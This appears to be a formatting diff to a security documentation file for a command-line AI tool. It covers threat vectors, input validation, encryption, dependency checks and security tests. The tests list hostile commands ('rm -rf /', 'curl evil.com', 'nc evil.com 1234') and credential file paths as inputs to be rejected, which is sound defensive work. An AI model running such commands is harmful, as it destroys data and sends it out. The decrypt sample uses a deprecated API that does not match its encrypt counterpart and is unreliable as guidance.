@@ -59,18 +59,21 @@ This document outlines the security policies, procedures, and best practices for
 ### Attack Vectors
 
 #### Local System Attacks
+
 - **File System Access**: Unauthorized access to sensitive files
 - **Command Injection**: Malicious command execution via shell tools
 - **Privilege Escalation**: Gaining elevated system privileges
 - **Data Exfiltration**: Stealing local files or credentials
 
 #### Network Attacks
+
 - **Man-in-the-Middle**: Intercepting API communications
 - **API Abuse**: Unauthorized or excessive API usage
 - **Credential Theft**: Stealing API keys or tokens
 - **Data Interception**: Eavesdropping on network traffic
 
 #### Code Injection Attacks
+
 - **Extension Malware**: Malicious extensions or MCP servers
 - **Dependency Compromise**: Compromised npm packages
 - **Update Attacks**: Malicious updates or patches
@@ -169,7 +172,7 @@ enum Permission {
   WRITE_FILES = 'files:write',
   EXECUTE_COMMANDS = 'commands:execute',
   NETWORK_ACCESS = 'network:access',
-  EXTENSION_INSTALL = 'extensions:install'
+  EXTENSION_INSTALL = 'extensions:install',
 }
 
 interface SecurityPolicy {
@@ -225,7 +228,11 @@ class InputValidator {
 
     // Restricted paths
     const restrictedPaths = ['/etc', '/root', '/System'];
-    if (restrictedPaths.some(restricted => normalizedPath.startsWith(restricted))) {
+    if (
+      restrictedPaths.some((restricted) =>
+        normalizedPath.startsWith(restricted),
+      )
+    ) {
       return { valid: false, error: 'Access to restricted path denied' };
     }
 
@@ -243,7 +250,7 @@ class InputValidator {
 
     // Dangerous pattern detection
     const dangerousPatterns = ['&&', '||', '|', ';', '>', '<', '`', '$'];
-    if (dangerousPatterns.some(pattern => command.includes(pattern))) {
+    if (dangerousPatterns.some((pattern) => command.includes(pattern))) {
       return { valid: false, error: 'Potentially dangerous command detected' };
     }
 
@@ -305,15 +312,12 @@ class DataEncryption {
     return {
       encrypted,
       iv: iv.toString('hex'),
-      authTag: authTag.toString('hex')
+      authTag: authTag.toString('hex'),
     };
   }
 
   static decrypt(encryptedData: EncryptedData, key: Buffer): string {
-    const decipher = crypto.createDecipher(
-      this.ENCRYPTION_ALGORITHM,
-      key
-    );
+    const decipher = crypto.createDecipher(this.ENCRYPTION_ALGORITHM, key);
 
     decipher.setAAD(Buffer.from('gemini-cli-v1'));
     decipher.setAuthTag(Buffer.from(encryptedData.authTag, 'hex'));
@@ -337,10 +341,13 @@ class SecureStorage {
     this.keyring = new Keyring('gemini-cli');
   }
 
-  async storeCredentials(service: string, credentials: Credentials): Promise<void> {
+  async storeCredentials(
+    service: string,
+    credentials: Credentials,
+  ): Promise<void> {
     const encrypted = DataEncryption.encrypt(
       JSON.stringify(credentials),
-      this.getEncryptionKey()
+      this.getEncryptionKey(),
     );
 
     await this.keyring.setPassword(service, JSON.stringify(encrypted));
@@ -352,7 +359,10 @@ class SecureStorage {
       if (!encryptedData) return null;
 
       const encrypted = JSON.parse(encryptedData);
-      const decrypted = DataEncryption.decrypt(encrypted, this.getEncryptionKey());
+      const decrypted = DataEncryption.decrypt(
+        encrypted,
+        this.getEncryptionKey(),
+      );
 
       return JSON.parse(decrypted);
     } catch (error) {
@@ -380,12 +390,15 @@ class NetworkClient {
         'ECDHE-RSA-AES128-GCM-SHA256',
         'ECDHE-RSA-AES256-GCM-SHA384',
         'ECDHE-RSA-AES128-SHA256',
-        'ECDHE-RSA-AES256-SHA384'
-      ].join(':')
+        'ECDHE-RSA-AES256-SHA384',
+      ].join(':'),
     });
   }
 
-  private validateServerIdentity(hostname: string, cert: any): Error | undefined {
+  private validateServerIdentity(
+    hostname: string,
+    cert: any,
+  ): Error | undefined {
     // Additional certificate validation
     if (this.isRevoked(cert)) {
       return new Error('Certificate revoked');
@@ -404,10 +417,7 @@ class NetworkClient {
 
 ```typescript
 class SecureApiClient {
-  async makeSecureRequest<T>(
-    url: string,
-    options: RequestOptions
-  ): Promise<T> {
+  async makeSecureRequest<T>(url: string, options: RequestOptions): Promise<T> {
     // Request signing
     const signature = this.signRequest(options);
     options.headers['X-Request-Signature'] = signature;
@@ -435,7 +445,7 @@ class SecureApiClient {
       method: options.method,
       url: options.url,
       headers: options.headers,
-      body: options.body
+      body: options.body,
     });
 
     return crypto
@@ -467,7 +477,7 @@ const securityRules = {
   'security/detect-non-literal-require': 'warn',
   'security/detect-possible-timing-attacks': 'warn',
   'security/detect-pseudoRandomBytes': 'error',
-  'security/detect-unsafe-regex': 'error'
+  'security/detect-unsafe-regex': 'error',
 };
 ```
 
@@ -508,7 +518,7 @@ class AuthValidator {
   validateSignature(provided: string, expected: string): boolean {
     return crypto.timingSafeEqual(
       Buffer.from(provided, 'hex'),
-      Buffer.from(expected, 'hex')
+      Buffer.from(expected, 'hex'),
     );
   }
 }
@@ -520,7 +530,10 @@ class AuthValidator {
 
 ```typescript
 class DependencyValidator {
-  async validatePackage(packageName: string, version: string): Promise<ValidationResult> {
+  async validatePackage(
+    packageName: string,
+    version: string,
+  ): Promise<ValidationResult> {
     // Check known vulnerabilities
     const vulnCheck = await this.checkVulnerabilities(packageName, version);
     if (!vulnCheck.clean) {
@@ -528,7 +541,10 @@ class DependencyValidator {
     }
 
     // Verify package integrity
-    const integrityCheck = await this.verifyPackageIntegrity(packageName, version);
+    const integrityCheck = await this.verifyPackageIntegrity(
+      packageName,
+      version,
+    );
     if (!integrityCheck.valid) {
       return { valid: false, error: 'Package integrity verification failed' };
     }
@@ -542,11 +558,14 @@ class DependencyValidator {
     return { valid: true };
   }
 
-  private async checkVulnerabilities(name: string, version: string): Promise<VulnerabilityResult> {
+  private async checkVulnerabilities(
+    name: string,
+    version: string,
+  ): Promise<VulnerabilityResult> {
     const auditResult = await npm.audit(`${name}@${version}`);
     return {
       clean: auditResult.vulnerabilities.length === 0,
-      vulnerabilities: auditResult.vulnerabilities
+      vulnerabilities: auditResult.vulnerabilities,
     };
   }
 }
@@ -586,7 +605,7 @@ class SecureBuildPipeline {
       minify: true,
       sourceMap: false, // No source maps in production
       optimization: true,
-      securityHeaders: true
+      securityHeaders: true,
     };
 
     const result = await this.runBuild(buildOptions);
@@ -619,7 +638,7 @@ class SecureUpdateManager {
     // Verify update signature
     const updates = response.data;
     for (const update of updates) {
-      if (!await this.verifyUpdateSignature(update)) {
+      if (!(await this.verifyUpdateSignature(update))) {
         throw new SecurityError('Invalid update signature');
       }
     }
@@ -632,7 +651,7 @@ class SecureUpdateManager {
     const updateFile = await this.downloadUpdate(update.url, update.hash);
 
     // Verify signature before applying
-    if (!await this.verifyUpdateSignature(updateFile)) {
+    if (!(await this.verifyUpdateSignature(updateFile))) {
       throw new SecurityError('Update signature verification failed');
     }
 
@@ -681,7 +700,7 @@ class SecurityEventMonitor {
       await this.sendSecurityAlert({
         type: 'BRUTE_FORCE_ATTACK',
         source: event.source,
-        timestamp: event.timestamp
+        timestamp: event.timestamp,
       });
     }
   }
@@ -744,12 +763,11 @@ describe('Security Tests', () => {
         '../../../etc/passwd',
         '/etc/shadow',
         'C:\\Windows\\System32',
-        '..\\..\\windows\\system32'
+        '..\\..\\windows\\system32',
       ];
 
       for (const path of maliciousPaths) {
-        expect(() => validateFilePath(path))
-          .toThrow('Invalid path detected');
+        expect(() => validateFilePath(path)).toThrow('Invalid path detected');
       }
     });
 
@@ -758,12 +776,13 @@ describe('Security Tests', () => {
         'ls; rm -rf /',
         'cat file && curl evil.com',
         'ls | nc evil.com 1234',
-        'ls `rm file`'
+        'ls `rm file`',
       ];
 
       for (const cmd of maliciousCommands) {
-        expect(() => validateShellCommand(cmd))
-          .toThrow('Potentially dangerous command detected');
+        expect(() => validateShellCommand(cmd)).toThrow(
+          'Potentially dangerous command detected',
+        );
       }
     });
   });
@@ -774,7 +793,7 @@ describe('Security Tests', () => {
         '', // Empty
         'abc', // Too short
         'key with spaces', // Invalid characters
-        '12345'.repeat(100) // Too long
+        '12345'.repeat(100), // Too long
       ];
 
       for (const key of invalidKeys) {
@@ -839,12 +858,18 @@ class SecurityDashboard {
   async getSecurityMetrics(timeRange: TimeRange): Promise<SecurityMetrics> {
     return {
       authenticationFailures: await this.countEvents('auth:failure', timeRange),
-      suspiciousFileAccess: await this.countEvents('file:suspicious', timeRange),
-      commandInjectionAttempts: await this.countEvents('command:injection', timeRange),
+      suspiciousFileAccess: await this.countEvents(
+        'file:suspicious',
+        timeRange,
+      ),
+      commandInjectionAttempts: await this.countEvents(
+        'command:injection',
+        timeRange,
+      ),
       vulnerabilityCount: await this.getVulnerabilityCount(),
       securityPatchesPending: await this.getPendingPatches(),
       meanTimeToDetection: await this.calculateMTTD(timeRange),
-      meanTimeToResponse: await this.calculateMTTR(timeRange)
+      meanTimeToResponse: await this.calculateMTTR(timeRange),
     };
   }
 }
